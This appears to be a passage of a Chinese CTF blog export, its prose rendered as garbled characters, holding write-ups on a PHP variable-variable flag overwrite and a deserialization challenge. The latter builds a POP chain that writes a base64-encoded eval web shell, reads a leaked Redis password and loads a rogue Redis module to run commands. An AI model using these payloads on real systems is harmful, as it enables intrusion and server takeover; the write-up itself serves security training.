class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä»£ç å®¡è®¡ä¸€ä¸‹ï¼Œå¿…é¡»ä»¥GETæˆ–POSTä¼ å…¥ä¸€ä¸ªflagå‚æ•°ï¼Œæ‰èƒ½ç»•è¿‡ç¬¬ä¸€ä¸ªexitï¼Œå¦‚æœflagå‚æ•°çš„å€¼ä¹ŸåŒä¸ºflagï¼Œé‚£ä¼šè¢«ç¬¬äºŒä¸ªexitç»ˆæ­¢ï¼Œå¦‚æœflagå‚æ•°ä¸ä¸ºflagçš„è¯ï¼Œåé¢flagçš„å€¼å°±ä¼šè¢«æ–°çš„å€¼è¦†ç›–æ‰</p>
<p>åˆ†æä¸€ä¸‹ä¸¤ä¸ªforeachå¾ªç¯ï¼šå½¢å¦‚ä¼ å‚name&#x3D;xtyyï¼Œé‚£ä¹ˆå°±ä¼šä½¿$key&#x3D;name $value&#x3D;xtyy</p>
<p>é‡ç‚¹åœ¨äºç¬¬äºŒä¸ªforeachå¾ªç¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯å˜é‡çš„é—´æ¥å¼•ç”¨ï¼Œç›¸å½“äºæŠŠ$keyæ›¿æ¢æˆä¸Šé¢çš„nameï¼Œä¹Ÿå°±ä¼šå˜æˆ$name</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¼ å…¥çš„?name&#x3D;xtyyå°±ä¼šå˜æˆ$name&#x3D;$xtyyçš„ä¼ å‚ï¼Œ</p>
<p>å¦‚æœè¿™é‡Œä¼ å…¥a&#x3D;flagï¼Œå°±ä¼šæŠŠ$flagçš„å€¼å‚¨å­˜åœ¨å˜é‡$aä¸­ï¼Œåé¢å†è®©$flag&#x3D;$aï¼Œå°±å¯ä»¥æŠŠflagåŸæœ¬çš„å€¼æ‹¿å›æ¥</p>
<p>payloadï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?a=flag&amp;flag=a</span><br></pre></td></tr></table></figure>

<p>å…¶å®è¿™ç›¸å½“äº</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å½“ç„¶å¦‚æœä¼ å‚ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?a=flag&amp;b=a&amp;flag=b</span><br></pre></td></tr></table></figure>

<p>åªè¦èƒ½åœ¨æœ€åæŠŠå˜é‡flagçš„å€¼èµ‹å›æ¥ï¼Œéƒ½æ˜¯å¯ä»¥çš„</p>
<p>æˆåŠŸçš„æ‹¿åˆ°äº†flag</p>
<p><img src="/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/1.png" alt="image"></p>
]]></content>
      <categories>
        <category>æ—¥å¸¸writeup</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>[å¤©ç¿¼æ¯ 2021]esay_eval</title>
    <url>/2024/11/15/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval/</url>
    <content><![CDATA[<h1 id="å¤©ç¿¼æ¯-2021-esay-eval"><a href="#å¤©ç¿¼æ¯-2021-esay-eval" class="headerlink" title="[å¤©ç¿¼æ¯ 2021]esay_eval"></a>[å¤©ç¿¼æ¯ 2021]esay_eval</h1><h2 id="phpååºåˆ—åŒ–-redisææƒ"><a href="#phpååºåˆ—åŒ–-redisææƒ" class="headerlink" title="phpååºåˆ—åŒ– + redisææƒ"></a>phpååºåˆ—åŒ– + redisææƒ</h2><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://www.nssctf.cn/problem/364">https://www.nssctf.cn/problem/364</a></p>
<span id="more"></span>

<p>æ‹¿åˆ°é¢˜ç›®ï¼Œè¿›è¡Œä»£ç å®¡è®¡ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>],<span class="variable">$ret</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$ret</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ret</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$i</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$i</span>)!==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;you want to bypass wakeup ? no !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯phpååºåˆ—åŒ–ï¼Œè§¦å‘Aç±»ä¸­çš„evalå‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä¸ºäº†è§¦å‘evalå‡½æ•°ï¼Œè°ƒç”¨ call()é­”æœ¯æ–¹æ³•ï¼Œå½“è®¿é—®åˆ°å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ï¼Œè§¦å‘call()æ–¹æ³•ï¼Œä¹Ÿå°±åˆ©ç”¨åˆ°äº†Bç±»ä¸­çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>(); </span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡è¦æ³¨æ„ç»•è¿‡wakeupæ–¹æ³•ï¼Œå¦åˆ™å‘½ä»¤å°†ä¼šè¢«æ¸…ç©ºï¼Œå¦‚æœåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡wakeupçš„æ‰§è¡Œ</p>
<p>æ„é€ popé“¾ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;fputs(fopen(&#x27;123.php&#x27;,&#x27;w&#x27;),base64_decode(\&quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=\&quot;));&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>-&gt;a=<span class="variable">$p1</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;B&quot;:1:&#x27;</span>,<span class="string">&#x27;&quot;b&quot;:2:&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$p2</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> ä¼ å‚ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?poc=O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:86:&quot;fputs(fopen(&#x27;123.php&#x27;,&#x27;w&#x27;),base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot;));&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€å¥è¯æœ¨é©¬å†™å…¥123.phpæ–‡ä»¶ï¼Œè®¿é—®æ–‡ä»¶ï¼š</p>
<p><img src="/2024/11/15/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval/1.png" alt="img"></p>
<p>å‘ç°systemç­‰å‡½æ•°è¢«ç¦ç”¨ï¼Œç”¨èšå‰‘è¿æ¥ï¼š</p>
<p><img src="/2024/11/15/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval/2.png" alt="img"></p>
<p>è®¿é—®æ ¹ç›®å½•ï¼Œæç¤ºæƒé™ä¸è¶³ï¼Œåªå¥½æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<p>è¿™é‡Œæœ‰vimç¼“å­˜æ³„éœ²ï¼š</p>
<p>ä½¿ç”¨ vim ç¼–è¾‘å™¨ ç¼–è¾‘æ–‡æœ¬æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œç¼–è¾‘å®Œæˆåï¼Œå¤‡ä»½æ–‡ä»¶ä¼šè¢«è‡ªåŠ¨åˆ é™¤ã€‚</p>
<p>ä½†æ˜¯ï¼Œå½“ç¼–è¾‘æ„å¤–ç»ˆæ­¢æ—¶ï¼Œè¿™ä¸ªå¤‡ä»½æ–‡ä»¶å°±ä¼šä¿ç•™ï¼Œå¦‚æœå¤šæ¬¡ç¼–è¾‘æ–‡ä»¶éƒ½æ„å¤–é€€å‡ºï¼Œå¤‡ä»½æ–‡ä»¶å¹¶ä¸ä¼šè¦†ç›–ï¼Œè€Œæ˜¯ä»¥ swpã€swoã€swn ç­‰å…¶ä»–æ ¼å¼ï¼Œä¾æ¬¡å¤‡ä»½ã€‚</p>
<p>æŸ¥çœ‹config.php.swpæ–‡ä»¶ï¼š</p>
<p>å­˜åœ¨ä¸å¯è§å­—ç¬¦ï¼Œæ•´ç†å¯è§å­—ç¬¦åå¤§è‡´æ˜¯è¿™äº›ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">define(&quot;REDIS_PASS&quot;,&quot;you_cannot_guess_it&quot;);</span><br><span class="line"></span><br><span class="line">define(&quot;DB_DATABASE&quot;,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">define(&quot;DB_PASSWOrd&quot;,&quot;&quot;);</span><br><span class="line"></span><br><span class="line">define(&quot;DB_USERNAME&quot;,&quot;root&quot;);</span><br><span class="line"></span><br><span class="line">define(&quot;DB_HOST&quot;,&quot;localhost&quot;);</span><br></pre></td></tr></table></figure>



<p>æ³„éœ²äº†redisçš„å¯†ç </p>
<p>Redis ä¸­çš„ exp.so æ–‡ä»¶å¯ä»¥è¿›è¡Œredisææƒã€‚è¿™æ˜¯ä¸€ä¸ª Redis æ¨¡å—ï¼Œå®ƒå¯ä»¥åœ¨ Redis æœåŠ¡å™¨ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<p>ä¸‹è½½exp.soæ–‡ä»¶ï¼š</p>
<p><a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p>
<p>ä¸Šä¼ æ–‡ä»¶åç”¨redisç®¡ç†æ’ä»¶è¿æ¥ï¼Œè¾“å…¥å¯†ç ï¼š</p>
<p><img src="/2024/11/15/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval/3.png" alt="img"></p>
<p>æ‰§è¡Œå‘½ä»¤è½½å…¥æ¨¡å—ï¼Œå¹¶å‘½ä»¤æ‰§è¡Œï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">MODULE LOAD /var/www/html/exp.so</span><br><span class="line"></span><br><span class="line">system.exec &quot;ls /&quot;</span><br><span class="line"></span><br><span class="line">system.exec &quot;cat /f*&quot;</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°flag</p>
<p><img src="/2024/11/15/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval/4.png" alt="img"></p>
]]></content>
      <categories>
        <category>æ—¥å¸¸writeup</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
</search>
